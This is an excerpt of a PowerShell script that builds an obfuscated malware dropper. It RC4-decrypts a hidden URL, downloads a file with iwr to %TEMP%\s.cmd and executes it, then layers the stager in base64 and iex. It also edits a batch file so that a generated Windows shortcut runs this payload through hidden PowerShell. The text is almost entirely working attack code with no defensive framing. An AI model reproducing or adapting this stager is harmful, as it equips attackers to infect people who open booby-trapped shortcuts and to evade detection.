...
$scriptStr = "`$c=[Convert]::FromBase64String('$cBase64');`$k=[Text.Encoding]::ASCII.GetBytes('$key');`$S=0..255;`$j=0;0..255|%{`$j=(`$j+`$S[`$_]+`$k[`$_%`$k.Length])%256;`$S[`$_],`$S[`$j]=`$S[`$j],`$S[`$_]};`$j=0;`$y=0;`$r=foreach(`$b in `$c){`$y=(`$y+1)%256;`$j=(`$j+`$S[`$y])%256;`$S[`$y],`$S[`$j]=`$S[`$j],`$S[`$y];`$b -bxor `$S[(`$S[`$y]+`$S[`$j])%256]};iwr([Text.Encoding]::ASCII.GetString(`$r)) -o `$env:TEMP\s.cmd;& `$env:TEMP\s.cmd"

$b64Script = [Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($scriptStr))

$payload = "iex([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('$b64Script')))"
...
for ($i=0; $i -lt $content.Length; $i++) {
    if ($content[$i] -match 'echo lnk.Arguments =') {
        $content[$i] = 'echo lnk.Arguments = "/c powershell -w hidden -Command ""' + $payload + '""" >> make_sc.vbs'
    }
}
